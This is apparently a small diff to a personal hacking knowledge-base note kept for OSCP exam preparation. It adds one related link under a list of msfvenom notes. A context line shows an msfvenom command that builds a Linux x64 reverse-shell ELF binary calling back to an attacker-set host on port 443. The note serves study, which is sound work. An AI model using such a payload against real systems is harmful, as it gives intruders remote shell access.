@@ -7,6 +7,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > rev_shel
 
 # Related
 
+- [20221014185901](/zet/20221014185901/README.md) kb file named kb/hacking/commands/msfvenom-commands.md
 - [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
 - [20221003150765](/zet/20221003150765/README.md) MSFVENOM Linux Binary (.elf) 32 Bit (x86)
 - ~/kb/hacking/commands/msfvenom-commands.md
